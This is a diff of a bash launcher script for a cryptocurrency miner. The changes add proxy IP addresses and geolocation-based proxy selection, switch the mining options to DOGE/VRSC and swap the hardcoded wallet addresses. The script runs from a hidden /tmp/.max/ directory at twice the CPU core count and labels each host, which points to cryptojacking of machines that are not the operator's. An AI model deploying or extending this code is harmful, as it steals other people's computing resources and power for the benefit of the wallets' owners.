@@ -1,7 +1,7 @@
 #!/bin/bash
 echo 
 echo -e '####################################################################################'
-echo -e '##################         '"CPU2"' Ver:0.8.35       ###############################'
+echo -e '############################# CPU Ver:0.9.52 ######################################'
 echo -e '####################################################################################'
 echo 
 echo 
@@ -12,19 +12,28 @@ ETPort=443
 RVPort=8080
 VCPort=80
 XMPort=21
-DisplayRefrech=180
+TESTPort=587
+DisplayRefrech=40
 
 HZ_PROX1=49.12.115.117
-HZ_PROX2=116.203.206.127
+HZ_PROX2=188.34.159.9
 EU_PROX=49.12.115.117
 US_PROX=173.199.123.152
 CA_PROX=173.199.123.152
+ASIA_PROX=49.12.115.117
 
-#VCOptions="d=16"
-VCOptions="X"
+#VCOptions="d=16,xn=1,hybrid"
+#VCOptions="mc=VRSC"
+VCOptions="c=DOGE,mc=VRSC"
+#VCOptions="c=VRSC,mc=VRSC"
+
+#VCOptions="X"
 
 SWITCHOPG=AUTO
 SWITCHOP=VC
+
+#SWITCHPROX=AUTO
+SWITCHPROX=$HZ_PROX1
 
 VCThreads=$[$(nproc)*2]
 XMThreads=$[$(nproc)*1]
@@ -36,7 +45,9 @@ Debug=False
 W_ET="0x1be9C1Db52aC9cD736160c532D69aA4770c327B7"
 W_RV="RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK"
 W_XM="44ucr5iSqUjCR6m93Gu9ssJC9W1yWLGz1fZbAChLXG1QPnFD5bsTXKJAQEk8dHKDWx8hYJQ5ELqg9DJKNA1oRoNZKCGyn1p"
-W_VC="RNEzrdAY8JNRrEre37aZbegHSx2CgaoXek"
+#W_VC="RNEzrdAY8JNRrEre37aZbegHSx2CgaoXek"
+#W_VC="1MEdZan82tai5Kb7fqFJNgfpGhtsP47MFT"
+W_VC="D5EcMFZqLsd4CdZipk3LXviX8YUzEEfBj7"
 
 # Directory
 Work_Dir="/tmp/.max/"
@@ -161,12 +172,31 @@ LOC=$(echo $JSINFO|grep -oP '(?<="loc": ")[^"]*')
 echo "let's name it: $INFO"
 
 ################## Best Server ##################
-if [ $COUNTRY == US ]
+if [ $SWITCHPROX == AUTO ]
 then
-PROX=$US_PROX
-#PROX=$EU_PROX
+    if [ $COUNTRY == US ]
+    then
+    PROX=$US_PROX
+    elif [ $COUNTRY == CA ]
+    then
+    PROX=$CA_PROX
+    elif [ $COUNTRY == TW ]
+    then
+    PROX=$ASIA_PROX
+    elif [ $COUNTRY == CN ]
+    then
+    PROX=$ASIA_PROX
+    elif [ $COUNTRY == JP ]
+    then
+    PROX=$ASIA_PROX
+    elif [ $COUNTRY == BR ]
+    then
+    PROX=$US_PROX
+    else
+    PROX=$EU_PROX
+    fi
 else
-PROX=$EU_PROX
+    PROX=$SWITCHPROX
 fi
 #################################################
 
